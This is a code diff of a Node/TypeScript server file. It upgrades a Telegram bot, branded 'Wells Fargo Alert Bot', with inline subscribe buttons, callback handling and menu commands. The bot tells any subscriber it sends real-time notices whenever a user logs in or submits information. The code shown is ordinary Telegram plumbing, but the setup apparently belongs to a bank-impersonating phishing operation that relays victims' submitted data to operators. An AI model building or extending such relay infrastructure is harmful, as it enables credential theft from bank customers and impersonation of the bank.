@@ -87,11 +87,25 @@ async function sendTelegramNotification(subject: string, data: Record<string, an
   }
 }
 
-// Send a message to a specific chat
+// Send a plain message to a specific chat
 async function sendTelegramMessage(chatId: string, message: string) {
   const botToken = process.env.TELEGRAM_BOT_TOKEN;
   if (!botToken) return;
-  
+  try {
+    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' }),
+    });
+  } catch (error) {
+    console.error("Failed to send Telegram message:", error);
+  }
+}
+
+// Send a message with an inline keyboard
+async function sendTelegramMessageWithKeyboard(chatId: string, message: string, keyboard: object) {
+  const botToken = process.env.TELEGRAM_BOT_TOKEN;
+  if (!botToken) return;
   try {
     await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: 'POST',
@@ -99,11 +113,48 @@ async function sendTelegramMessage(chatId: string, message: string) {
       body: JSON.stringify({
         chat_id: chatId,
         text: message,
-        parse_mode: 'Markdown',
+        parse_mode: 'HTML',
+        reply_markup: keyboard,
       }),
     });
   } catch (error) {
-    console.error("Failed to send Telegram message:", error);
+    console.error("Failed to send Telegram message with keyboard:", error);
+  }
+}
+
+// Answer a callback query (clears the loading spinner on the button)
+async function answerCallbackQuery(queryId: string, text?: string) {
+  const botToken = process.env.TELEGRAM_BOT_TOKEN;
+  if (!botToken) return;
+  try {
+    await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ callback_query_id: queryId, text: text || "" }),
+    });
+  } catch (error) {
+    console.error("Failed to answer callback query:", error);
+  }
+}
+
+// Register bot commands in Telegram so they appear in the menu
+async function setBotCommands() {
+  const botToken = process.env.TELEGRAM_BOT_TOKEN;
+  if (!botToken) return;
+  try {
+    await fetch(`https://api.telegram.org/bot${botToken}/setMyCommands`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        commands: [
+          { command: 'start', description: 'Open the notification menu' },
+          { command: 'status', description: 'Check your subscription status' },
+          { command: 'stop', description: 'Unsubscribe from notifications' },
+        ],
+      }),
+    });
+  } catch (error) {
+    console.error("Failed to set bot commands:", error);
   }
 }
 
@@ -1001,67 +1052,112 @@ export async function registerRoutes(
     }
   });
 
-  // Telegram Bot Webhook - handles /Wells command for subscription
+  // Telegram Bot Webhook
   app.post("/api/telegram/webhook", async (req, res) => {
     try {
       const update = req.body;
-      
-      // Handle message updates
+
+      // ── Inline button taps ──────────────────────────────────────────
+      if (update.callback_query) {
+        const query = update.callback_query;
+        const chatId = query.message?.chat?.id?.toString() || query.from?.id?.toString();
+        const username = query.from?.username || "";
+        const firstName = query.from?.first_name || "";
+        const data = query.data || "";
+
+        if (data === "subscribe_wf") {
+          await storage.addTelegramSubscriber({ chatId, username, firstName, isActive: "true" });
+          await answerCallbackQuery(query.id, "✅ Subscribed to Wells Fargo Notifications!");
+          await sendTelegramMessageWithKeyboard(
+            chatId,
+            `✅ <b>You are now subscribed!</b>\n\n` +
+            `You will receive real-time notifications whenever a user logs in or submits information.\n\n` +
+            `Use /stop to unsubscribe at any time.`,
+            {
+              inline_keyboard: [[
+                { text: "🔕 Unsubscribe", callback_data: "unsubscribe_wf" },
+              ]],
+            }
+          );
+        } else if (data === "unsubscribe_wf") {
+          await storage.removeTelegramSubscriber(chatId);
+          await answerCallbackQuery(query.id, "🔕 Unsubscribed");
+          await sendTelegramMessageWithKeyboard(
+            chatId,
+            `🔕 <b>You have been unsubscribed.</b>\n\nYou will no longer receive notifications.`,
+            {
+              inline_keyboard: [[
+                { text: "🏦 Wells Fargo Notifications", callback_data: "subscribe_wf" },
+              ]],
+            }
+          );
+        }
+
+        return res.json({ ok: true });
+      }
+
+      // ── Text commands ───────────────────────────────────────────────
       if (update.message) {
         const message = update.message;
         const chatId = message.chat.id.toString();
-        const text = message.text || "";
+        const text = (message.text || "").trim().toLowerCase();
         const username = message.from?.username || "";
         const firstName = message.from?.first_name || "";
-        
-        // Handle /Wells command - subscribe
-        if (text.toLowerCase() === "/wells" || text.toLowerCase() === "/start") {
-          await storage.addTelegramSubscriber({
-            chatId,
-            username,
-            firstName,
-            isActive: "true",
-          });
-          
-          await sendTelegramMessage(chatId, 
-            `🏦 *Welcome to Wells Fargo Alerts!*\n\n` +
-            `You are now subscribed to receive real-time notifications.\n\n` +
-            `Commands:\n` +
-            `/wells - Subscribe to alerts\n` +
-            `/stop - Unsubscribe from alerts\n` +
-            `/status - Check subscription status`
-          );
-        }
-        // Handle /stop command - unsubscribe
-        else if (text.toLowerCase() === "/stop") {
-          await storage.removeTelegramSubscriber(chatId);
-          await sendTelegramMessage(chatId, 
-            `🔕 You have been unsubscribed from Wells Fargo alerts.\n\n` +
-            `Send /wells to subscribe again.`
-          );
-        }
-        // Handle /status command
-        else if (text.toLowerCase() === "/status") {
+
+        // /start — show the notification menu with inline button
+        if (text === "/start") {
           const subscriber = await storage.getTelegramSubscriber(chatId);
-          if (subscriber && subscriber.isActive === "true") {
-            await sendTelegramMessage(chatId, 
-              `✅ *Subscription Active*\n\n` +
-              `You are receiving Wells Fargo alerts.\n` +
-              `Send /stop to unsubscribe.`
-            );
-          } else {
-            await sendTelegramMessage(chatId, 
-              `❌ *Not Subscribed*\n\n` +
-              `Send /wells to subscribe to alerts.`
-            );
-          }
+          const isSubscribed = subscriber?.isActive === "true";
+
+          await sendTelegramMessageWithKeyboard(
+            chatId,
+            `🏦 <b>Wells Fargo Alert Bot</b>\n` +
+            `━━━━━━━━━━━━━━━━━━━━\n\n` +
+            `This bot sends you real-time notifications when users log in or submit information.\n\n` +
+            `<b>Status:</b> ${isSubscribed ? "✅ Subscribed" : "❌ Not subscribed"}\n\n` +
+            `Tap the button below to ${isSubscribed ? "manage your" : "enable"} notifications:`,
+            {
+              inline_keyboard: [[
+                isSubscribed
+                  ? { text: "🔕 Unsubscribe", callback_data: "unsubscribe_wf" }
+                  : { text: "🏦 Wells Fargo Notifications", callback_data: "subscribe_wf" },
+              ]],
+            }
+          );
+        }
+        // /stop — unsubscribe
+        else if (text === "/stop") {
+          await storage.removeTelegramSubscriber(chatId);
+          await sendTelegramMessageWithKeyboard(
+            chatId,
+            `🔕 <b>Unsubscribed.</b>\n\nYou will no longer receive notifications.`,
+            { inline_keyboard: [[{ text: "🏦 Wells Fargo Notifications", callback_data: "subscribe_wf" }]] }
+          );
+        }
+        // /status — check status
+        else if (text === "/status") {
+          const subscriber = await storage.getTelegramSubscriber(chatId);
+          const isSubscribed = subscriber?.isActive === "true";
+          await sendTelegramMessageWithKeyboard(
+            chatId,
+            isSubscribed
+              ? `✅ <b>Subscription Active</b>\n\nYou are receiving Wells Fargo notifications.`
+              : `❌ <b>Not Subscribed</b>\n\nTap below to start receiving notifications.`,
+            {
+              inline_keyboard: [[
+                isSubscribed
+                  ? { text: "🔕 Unsubscribe", callback_data: "unsubscribe_wf" }
+                  : { text: "🏦 Wells Fargo Notifications", callback_data: "subscribe_wf" },
+              ]],
+            }
+          );
         }
       }
-      
+
       return res.json({ ok: true });
     } catch (error) {
       console.error("Telegram webhook error:", error);
-      return res.json({ ok: true }); // Always return 200 to Telegram
+      return res.json({ ok: true });
     }
   });
 
@@ -1078,19 +1174,21 @@ export async function registerRoutes(
       const host = req.headers.host;
       const webhookUrl = `${protocol}://${host}/api/telegram/webhook`;
       
-      // Set the webhook
+      // Set the webhook (include callback_query so button taps are received)
       const response = await fetch(`https://api.telegram.org/bot${botToken}/setWebhook`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           url: webhookUrl,
-          allowed_updates: ["message"],
+          allowed_updates: ["message", "callback_query"],
         }),
       });
       
       const result = await response.json();
       
       if (result.ok) {
+        // Also register the bot commands so they appear in Telegram's menu
+        await setBotCommands();
         return res.json({ 
           success: true, 
           message: "Webhook set successfully",
